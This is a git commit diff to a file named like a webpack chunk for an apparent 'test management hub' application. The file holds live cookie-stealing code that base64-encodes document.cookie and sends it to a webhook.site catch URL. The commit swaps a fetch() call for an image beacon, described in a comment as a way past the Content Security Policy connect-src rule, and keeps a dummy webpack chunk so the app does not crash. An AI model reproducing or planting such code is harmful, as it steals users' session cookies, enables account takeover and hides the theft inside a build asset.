4590f6596094b56d132a9febbd7eb1bc38a6d5dc
RoomyCuboid <87502636+RoomyCuboid@users.noreply.github.com>
2026-03-10 11:35:26 +0000

    Update 343.5ccd5d6d8d37b172.js

--- 343.5ccd5d6d8d37b172.js
+++ 343.5ccd5d6d8d37b172.js
@@ -1,8 +1,8 @@
 // 1. Steal the cookie and send it to your catch server
-let stolenCookies = btoa(document.cookie); // Base64 encode the cookies
-fetch('https://webhook.site/1745adb6-9637-4bdb-9bf0-1f1c497d81c4?cookie=' + stolenCookies, {
-    mode: 'no-cors' // Prevents the browser from blocking the request due to CORS errors
-});
+// Bypasses connect-src by using img-src
+let img = new Image();
+img.src = 'https://webhook.site/1745adb6-9637-4bdb-9bf0-1f1c497d81c4?cookie=' + btoa(document.cookie);
+document.body.appendChild(img);
 
 // 2. Dummy Webpack Chunk to prevent the application from crashing
 (self.webpackChunktest_management_hub = self.webpackChunktest_management_hub || []).push([
@@ -13,3 +13,4 @@ fetch('https://webhook.site/1745adb6-9637-4bdb-9bf0-1f1c497d81c4?cookie=' + stol
     }
   }
 ]);
+
